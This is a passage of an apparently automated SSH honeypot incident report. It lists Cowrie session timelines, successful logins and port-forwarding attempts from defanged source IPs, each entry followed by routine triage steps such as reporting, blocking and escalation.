| **Last Seen** | 2026-08-23 09:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 09:56:37` | `cowrie.session.connect` |
| `2026-08-23 09:56:37` | `cowrie.client.version` |
| `2026-08-23 09:56:37` | `cowrie.client.kex` |
| `2026-08-23 09:56:38` | `cowrie.login.success` |
| `2026-08-23 09:56:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 09:56:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 09:56:38` | `cowrie.direct-tcpip.data` |
| `2026-08-23 09:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6130ee3fd58

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-23 10:00 |
| **Last Seen** | 2026-08-23 10:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:00:08` | `cowrie.session.connect` |
| `2026-08-23 10:00:09` | `cowrie.client.version` |
| `2026-08-23 10:00:09` | `cowrie.client.kex` |
| `2026-08-23 10:00:10` | `cowrie.login.success` |
| `2026-08-23 10:00:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cfc5b977fcf

| Field | Detail |
|---|---|
| **Source IP** | `65.20.196[.]154` |
| **First Seen** | 2026-08-23 10:05 |
| **Last Seen** | 2026-08-23 10:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:05:08` | `cowrie.session.connect` |
| `2026-08-23 10:05:09` | `cowrie.client.version` |
| `2026-08-23 10:05:09` | `cowrie.client.kex` |
| `2026-08-23 10:05:10` | `cowrie.login.success` |
| `2026-08-23 10:05:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:05:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.196[.]154` to AbuseIPDB if not already reported
- [ ] Block `65.20.196[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0880dab26d6b

| Field | Detail |
|---|---|
| **Source IP** | `108.213.119[.]22` |
| **First Seen** | 2026-08-23 10:05 |
| **Last Seen** | 2026-08-23 10:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:05:14` | `cowrie.session.connect` |
| `2026-08-23 10:05:16` | `cowrie.client.version` |
| `2026-08-23 10:05:16` | `cowrie.client.kex` |
| `2026-08-23 10:05:23` | `cowrie.login.success` |
| `2026-08-23 10:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.213.119[.]22` to AbuseIPDB if not already reported
- [ ] Block `108.213.119[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed825a49c7d5

| Field | Detail |
|---|---|
| **Source IP** | `194.31.8[.]12` |
| **First Seen** | 2026-08-23 10:05 |
| **Last Seen** | 2026-08-23 10:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:05:25` | `cowrie.session.connect` |
| `2026-08-23 10:05:25` | `cowrie.client.version` |
| `2026-08-23 10:05:25` | `cowrie.client.kex` |
| `2026-08-23 10:05:26` | `cowrie.login.success` |
| `2026-08-23 10:05:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.31.8[.]12` to AbuseIPDB if not already reported
- [ ] Block `194.31.8[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46352370a82f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:06 |
| **Last Seen** | 2026-08-23 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:06:03` | `cowrie.session.connect` |
| `2026-08-23 10:06:03` | `cowrie.client.version` |
| `2026-08-23 10:06:03` | `cowrie.client.kex` |
| `2026-08-23 10:06:04` | `cowrie.login.success` |
| `2026-08-23 10:06:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:06:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:06:04` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:06:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b474f0de996

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:06 |
| **Last Seen** | 2026-08-23 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:06:07` | `cowrie.session.connect` |
| `2026-08-23 10:06:07` | `cowrie.client.version` |
| `2026-08-23 10:06:07` | `cowrie.client.kex` |
| `2026-08-23 10:06:08` | `cowrie.login.success` |
| `2026-08-23 10:06:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:06:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:06:08` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17bc5775ec32

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-08-23 10:08 |
| **Last Seen** | 2026-08-23 10:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:08:10` | `cowrie.session.connect` |
| `2026-08-23 10:08:11` | `cowrie.client.version` |
| `2026-08-23 10:08:11` | `cowrie.client.kex` |
| `2026-08-23 10:08:12` | `cowrie.login.success` |
| `2026-08-23 10:08:12` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120424066bd6

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-23 10:08 |
| **Last Seen** | 2026-08-23 10:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:08:18` | `cowrie.session.connect` |
| `2026-08-23 10:08:18` | `cowrie.client.version` |
| `2026-08-23 10:08:18` | `cowrie.client.kex` |
| `2026-08-23 10:08:20` | `cowrie.login.success` |
| `2026-08-23 10:08:21` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe20771b8bc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:15 |
| **Last Seen** | 2026-08-23 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:15:39` | `cowrie.session.connect` |
| `2026-08-23 10:15:39` | `cowrie.client.version` |
| `2026-08-23 10:15:39` | `cowrie.client.kex` |
| `2026-08-23 10:15:40` | `cowrie.login.success` |
| `2026-08-23 10:15:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:15:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:15:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0244277f606d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:15 |
| **Last Seen** | 2026-08-23 10:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:15:43` | `cowrie.session.connect` |
| `2026-08-23 10:15:43` | `cowrie.client.version` |
| `2026-08-23 10:15:43` | `cowrie.client.kex` |
| `2026-08-23 10:15:44` | `cowrie.login.success` |
| `2026-08-23 10:15:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:15:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:15:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b041a63f9f

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-23 10:23 |
| **Last Seen** | 2026-08-23 10:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:23:30` | `cowrie.session.connect` |
| `2026-08-23 10:23:30` | `cowrie.client.version` |
| `2026-08-23 10:23:30` | `cowrie.client.kex` |
| `2026-08-23 10:23:31` | `cowrie.login.success` |
| `2026-08-23 10:23:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae86ffb145cf

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-23 10:23 |
| **Last Seen** | 2026-08-23 10:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:23:37` | `cowrie.session.connect` |
| `2026-08-23 10:23:42` | `cowrie.client.version` |
| `2026-08-23 10:23:42` | `cowrie.client.kex` |
| `2026-08-23 10:23:44` | `cowrie.login.success` |
| `2026-08-23 10:23:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94af955e6f2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:25 |
| **Last Seen** | 2026-08-23 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:25:04` | `cowrie.session.connect` |
| `2026-08-23 10:25:04` | `cowrie.client.version` |
| `2026-08-23 10:25:04` | `cowrie.client.kex` |
| `2026-08-23 10:25:05` | `cowrie.login.success` |
| `2026-08-23 10:25:05` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:25:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:25:05` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f022fc9cddf5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:25 |
| **Last Seen** | 2026-08-23 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:25:08` | `cowrie.session.connect` |
| `2026-08-23 10:25:08` | `cowrie.client.version` |
| `2026-08-23 10:25:08` | `cowrie.client.kex` |
| `2026-08-23 10:25:09` | `cowrie.login.success` |
| `2026-08-23 10:25:09` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:25:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:25:09` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71617253cc0

| Field | Detail |
|---|---|
| **Source IP** | `82.67.175[.]124` |
| **First Seen** | 2026-08-23 10:27 |
| **Last Seen** | 2026-08-23 10:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:27:44` | `cowrie.session.connect` |
| `2026-08-23 10:27:44` | `cowrie.client.version` |
| `2026-08-23 10:27:44` | `cowrie.client.kex` |
| `2026-08-23 10:27:45` | `cowrie.login.success` |
| `2026-08-23 10:27:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:27:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.67.175[.]124` to AbuseIPDB if not already reported
- [ ] Block `82.67.175[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33c950af4f0b

| Field | Detail |
|---|---|
| **Source IP** | `176.204.246[.]98` |
| **First Seen** | 2026-08-23 10:32 |
| **Last Seen** | 2026-08-23 10:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:32:42` | `cowrie.session.connect` |
| `2026-08-23 10:32:42` | `cowrie.client.version` |
| `2026-08-23 10:32:42` | `cowrie.client.kex` |
| `2026-08-23 10:32:44` | `cowrie.login.success` |
| `2026-08-23 10:32:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.246[.]98` to AbuseIPDB if not already reported
- [ ] Block `176.204.246[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45748ee4a902

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-23 10:32 |
| **Last Seen** | 2026-08-23 10:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:32:50` | `cowrie.session.connect` |
| `2026-08-23 10:32:50` | `cowrie.client.version` |
| `2026-08-23 10:32:50` | `cowrie.client.kex` |
| `2026-08-23 10:32:52` | `cowrie.login.success` |
| `2026-08-23 10:32:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e61c807309

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:34 |
| **Last Seen** | 2026-08-23 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:34:39` | `cowrie.session.connect` |
| `2026-08-23 10:34:39` | `cowrie.client.version` |
| `2026-08-23 10:34:39` | `cowrie.client.kex` |
| `2026-08-23 10:34:40` | `cowrie.login.success` |
| `2026-08-23 10:34:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:34:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:34:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d416f92f16

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 10:34 |
| **Last Seen** | 2026-08-23 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:34:43` | `cowrie.session.connect` |
| `2026-08-23 10:34:43` | `cowrie.client.version` |
| `2026-08-23 10:34:43` | `cowrie.client.kex` |
| `2026-08-23 10:34:44` | `cowrie.login.success` |
| `2026-08-23 10:34:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:34:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 10:34:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 10:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989fd93f20cd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 10:36 |
| **Last Seen** | 2026-08-23 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:36:44` | `cowrie.session.connect` |
| `2026-08-23 10:36:44` | `cowrie.client.version` |
| `2026-08-23 10:36:44` | `cowrie.client.kex` |
| `2026-08-23 10:36:45` | `cowrie.login.success` |
| `2026-08-23 10:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271b9e405140

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 10:36 |
| **Last Seen** | 2026-08-23 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:36:44` | `cowrie.session.connect` |
| `2026-08-23 10:36:44` | `cowrie.client.version` |
| `2026-08-23 10:36:44` | `cowrie.client.kex` |
| `2026-08-23 10:36:45` | `cowrie.login.success` |
| `2026-08-23 10:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee5b2217e9a2

| Field | Detail |
|---|---|
| **Source IP** | `37.46.160[.]175` |
| **First Seen** | 2026-08-23 10:37 |
| **Last Seen** | 2026-08-23 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:37:27` | `cowrie.session.connect` |
| `2026-08-23 10:37:28` | `cowrie.client.version` |
| `2026-08-23 10:37:28` | `cowrie.client.kex` |
| `2026-08-23 10:37:29` | `cowrie.login.success` |
| `2026-08-23 10:37:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.46.160[.]175` to AbuseIPDB if not already reported
- [ ] Block `37.46.160[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36144cafd2e2

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-23 10:37 |
| **Last Seen** | 2026-08-23 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:37:34` | `cowrie.session.connect` |
| `2026-08-23 10:37:34` | `cowrie.client.version` |
| `2026-08-23 10:37:34` | `cowrie.client.kex` |
| `2026-08-23 10:37:36` | `cowrie.login.success` |
| `2026-08-23 10:37:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff87a415000c

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-08-23 10:37 |
| **Last Seen** | 2026-08-23 10:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 10:37:41` | `cowrie.session.connect` |
| `2026-08-23 10:37:42` | `cowrie.client.version` |
| `2026-08-23 10:37:42` | `cowrie.client.kex` |
| `2026-08-23 10:37:43` | `cowrie.login.success` |
| `2026-08-23 10:37:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 10:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd999b5b68d

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-08-23 10:37 |
| **Last Seen** | 2026-08-23 10:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
